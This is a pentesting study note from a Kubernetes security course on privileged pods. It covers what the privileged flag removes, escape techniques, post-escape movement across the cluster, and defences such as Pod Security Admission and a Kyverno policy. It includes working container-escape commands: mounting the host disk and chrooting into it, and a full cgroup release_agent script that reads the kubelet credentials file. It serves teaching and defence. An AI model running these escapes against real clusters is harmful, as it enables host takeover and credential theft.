---
tags: [kubernetes, pod-security, privileged-pods, container-escape, pentesting]
difficulty: advanced
module: "38 - Container and Kubernetes Security"
topic: "38.15 Privileged Pods"
---

# Pod Security — Privileged Pods

## Introduction
In the Kubernetes ecosystem, Pods are the smallest deployable computing units. By default, containers running inside these Pods are heavily restricted by Linux namespaces, cgroups, and capabilities, providing a robust layer of isolation between the containerized application and the underlying host operating system (the worker node). 

However, there are scenarios where a container legitimately requires direct access to the host's hardware, network stack, or kernel—such as network plugins (CNI), storage drivers (CSI), or monitoring agents (like Datadog or Prometheus). To facilitate this, Kubernetes provides a `securityContext` flag called `privileged: true`.

When a Pod runs as privileged, almost all container isolation mechanisms are stripped away. From a security perspective, a privileged container is virtually identical to a root shell on the underlying host node. This document breaks down exactly what "privileged" means, the technical vectors it exposes for container escape, and how to defend against this severe misconfiguration.

## The Anatomy of a Privileged Pod

When a Pod's specification includes `privileged: true` under its `securityContext`, the container runtime (e.g., containerd, CRI-O, Docker) executes the container with a specific set of dangerous permissions.

### What Changes When `privileged: true` is Set?
1. **Full Linux Capabilities**: By default, K8s drops dangerous Linux capabilities (like `CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, `CAP_SYS_PTRACE`). A privileged container receives *all* Linux capabilities. 
2. **AppArmor and SELinux Bypass**: Security profiles are disabled. The container is not constrained by AppArmor profiles or SELinux context restrictions.
3. **Unrestricted Device Access**: The entire host's `/dev` directory is accessible. The container can see and interact with host block devices (hard drives).
4. **cgroup Access**: The container can often modify cgroups, which can be manipulated to break out of the container environment.
5. **Seccomp Bypass**: The default seccomp profile is ignored, allowing the container to execute any system call.

### The Manifest
A vulnerable Pod manifest looks like this:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-attacker
spec:
  containers:
  - name: ubuntu
    image: ubuntu:latest
    command: [ "/bin/sleep", "inf" ]
    securityContext:
      privileged: true   # <--- The critical vulnerability
```

## Visualizing the Container Escape

```ascii
   +-------------------------------------------------------------+
   |  Kubernetes Worker Node (Host OS)                           |
   |                                                             |
   |  +-----------------------+       +-----------------------+  |
   |  | Normal Pod            |       | Privileged Pod        |  |
   |  | - Restricted Caps     |       | - ALL Capabilities    |  |
   |  | - Filtered Syscalls   |       | - Unfiltered Syscalls |  |
   |  | - Isolated Devices    |       | - Access to Host /dev |  |
   |  |                       |       |                       |  |
   |  |   [ Application ]     |       |   [ Attacker Shell ]  |  |
   |  +-----------------------+       +----------+------------+  |
   |                                             |               |
   |       Mounting Host Filesystem <------------+               |
   |       (e.g. /dev/sda1)                                      |
   |                                                             |
   |       [ Host Kernel ] <-------------------------------------+
   |       (Full Syscall Access)                                 |
   +-------------------------------------------------------------+
```

## Exploitation: Breaking Out of a Privileged Pod

If an attacker compromises an application running inside a privileged pod (e.g., via Remote Code Execution, or by stealing deployment credentials and deploying a privileged pod), escaping to the host node is trivial. There are multiple well-documented techniques to achieve this.

### Technique 1: Mounting the Host Filesystem via `/dev`
Because a privileged container has access to all host devices in `/dev`, the attacker can simply mount the host's primary disk partition into the container.

**Execution Steps:**
1. Identify the host's main filesystem partition. This is usually `sda1`, `nvme0n1p1`, or `vda1`.
   ```bash
   lsblk
   # or
   fdisk -l
   ```
2. Create a mount point and mount the drive.
   ```bash
   mkdir /mnt/host
   mount /dev/sda1 /mnt/host
   ```
3. Chroot into the host file system.
   ```bash
   chroot /mnt/host /bin/bash
   ```
At this point, the attacker has a root shell directly on the Kubernetes worker node. They can read `/etc/shadow`, access the `kubelet` configuration, steal the node's TLS certificates, and pivot to other pods running on that node.

### Technique 2: Exploiting `CAP_SYS_ADMIN` and `cgroups` (The release_agent escape)
Even if access to `/dev` is somewhat restricted or the filesystem structure is complex, the presence of `CAP_SYS_ADMIN` allows for a classic cgroups escape utilizing the `release_agent` feature.

The `release_agent` is a kernel feature that executes a specified script when a cgroup becomes empty. An attacker can create a new cgroup, register a malicious script as the `release_agent`, and then trigger it. The script will be executed by the host's kernel, outside the container namespaces.

**Execution Steps:**
```bash
# 1. Mount the RDMA cgroup controller
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# 2. Enable cgroup notifications
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. Get the path of the container on the host
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# 4. Set the release_agent to point to our payload on the host
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 5. Create the payload (this will execute on the host)
echo '#!/bin/sh' > /cmd
echo "cat /etc/kubernetes/kubelet.conf > $host_path/output" >> /cmd
chmod a+x /cmd

# 6. Trigger the release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
The output file will now contain the host's `kubelet.conf`.

### Technique 3: Injecting into Host Processes (ptrace)
With `CAP_SYS_PTRACE`, an attacker can debug and inspect other processes. While a container normally only sees its own processes via PID namespace isolation, if the pod was *also* deployed with `hostPID: true`, the attacker sees all host processes.
Even without `hostPID`, if the attacker can escape the filesystem, they can use `ptrace` or write to `/proc/sys/kernel/core_pattern` to achieve arbitrary code execution in the context of the host kernel.

## Post-Escape: Node Compromise to Cluster Compromise
Escaping the container is only the first step. Once on the node, the attacker's goal is to elevate privileges to the cluster level.
1. **Kubelet Credentials**: The node's `kubelet` service authenticates to the API server. By stealing `/etc/kubernetes/kubelet.conf`, the attacker can impersonate the node.
2. **Reading Secrets**: The kubelet has access to the secrets of all Pods scheduled on that specific node.
3. **Kube-proxy manipulation**: The attacker can manipulate iptables rules on the node to intercept or reroute traffic intended for other services.
4. **DaemonSet Pivot**: If the compromised node runs a DaemonSet pod with high cluster privileges (like a security agent or CNI plugin), the attacker can steal its Service Account token.

## Defense and Remediation

Relying on developers to "just not use `privileged: true`" is an ineffective security strategy. Enforcement must happen at the cluster level via Admission Controllers.

### 1. Pod Security Admission (PSA)
Starting in K8s v1.25, Pod Security Policies (PSP) were completely removed and replaced by Pod Security Admission (PSA). PSA enforces standards based on namespaces.
To prevent privileged pods, enforce the `baseline` or `restricted` profile on user namespaces:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: development
  labels:
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/warn: restricted
```
The `baseline` profile explicitly forbids `privileged: true`.

### 2. Policy Engines (OPA Gatekeeper / Kyverno)
For more granular control, organizations deploy Open Policy Agent (OPA) Gatekeeper or Kyverno. These admission controllers can be configured with complex logic to deny any pod deployment containing `privileged: true` unless it originates from a specific trusted namespace (like `kube-system`).

**Example Kyverno Policy to block Privileged Pods:**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged-containers
spec:
  validationFailureAction: enforce
  rules:
  - name: privileged-containers
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Privileged containers are not allowed."
      pattern:
        spec:
          containers:
          - =(securityContext):
              =(privileged): "false"
```

### 3. Least Privilege Capabilities
Instead of running an entire container as privileged, developers should be forced to add only the specific Linux capabilities they need (e.g., `capAdd: ["NET_ADMIN"]`) while dropping all others (`capDrop: ["ALL"]`). This significantly reduces the attack surface while maintaining necessary functionality.

## Conclusion
Deploying a privileged pod is a massive security tradeoff. It breaks the fundamental security boundaries of containerization, offering a direct path to host node compromise. Offensive security assessments should heavily target `securityContext` misconfigurations, while defensive teams must implement hard enforcement mechanisms at the admission controller level to categorically block privileged containers in untrusted namespaces.

## Chaining Opportunities
- After escaping a Privileged Pod, attackers can perform [[17 - Service Account Token Theft]] from other pods running on the compromised node.
- Node compromise can lead to querying IMDS metadata (AWS/GCP), bridging K8s security into [[02 - Cloud Security Identity and Access Management]].
- If the node is a Control Plane node, it enables [[14 - Kubernetes etcd — Direct Access to Secrets]].

## Related Notes
- [[16 - HostPath Volume Mount Abuse]]
- [[11 - Linux Capabilities and Privilege Escalation]]
- [[12 - Kubernetes RBAC Misconfigurations]]
